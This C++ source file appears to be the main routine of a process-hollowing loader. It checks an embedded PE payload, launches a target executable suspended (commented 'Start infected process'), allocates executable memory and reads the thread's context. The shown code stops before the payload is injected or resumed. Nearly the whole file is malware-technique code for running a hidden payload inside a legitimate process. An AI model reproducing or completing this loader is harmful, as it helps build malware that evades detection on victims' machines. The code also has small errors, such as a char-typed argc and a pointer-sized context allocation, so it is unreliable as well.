#include <filesystem>

#include "shared.h"

#include "pkg/payload.h"
#include "pkg/pe.hpp"

#include <iostream>

int main(char argc, char** argv)
{
	if (std::filesystem::exists(argv[1]))
		printf("[+] File exists.\n");
	else 
		printf("[!] File doesn't exist.\n");

	if (sizeof(pkg::payload) > 1)
		printf("[+] Valid payload.\n");
	else
		printf("[!] Invalid payload.\n");

	auto exec = new pkg::Executable();

	exec->GetDosHeader(pkg::payload, exec->pDosHeader);
	if (exec->bIsValidDosHeader(exec->pDosHeader))
		printf("[+] Valid pDos.\n");
	else
		printf("[!] Invalid pDos.\n");

	// Start infected process
	bool result = CreateProcessA(argv[1], NULL, NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, LPSTARTUPINFOA(&exec->sInfo), &exec->pInfo);
	printf(result ? "[+] Process created.\n" : "[!] Couldn't create process.\n");
	if (!result) exit(EXIT_FAILURE);

	// Commit & Reserve memory page
	exec->pContext = (X_PCONTEXT)VirtualAlloc(NULL, sizeof(exec->pContext), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	exec->pContext->ContextFlags = CONTEXT_FULL;

	// Get thread context
	result = X_GetThreadContext(exec->pInfo.hThread, exec->pContext);
	printf(result ? "[+] Gathered thread context.\n" : "[!] Couldn't gather thread context.\n");
	if (!result)
	{
		std::cout << "Error code: " << GetLastError() << std::endl;
		Sleep(5000);
		exit(EXIT_FAILURE);
	}

	printf("[*] Context: 0x%p", exec->pContext);

	WaitForSingleObject(exec->pInfo.hThread, INFINITE);
	CloseHandle(exec->pInfo.hThread);
}
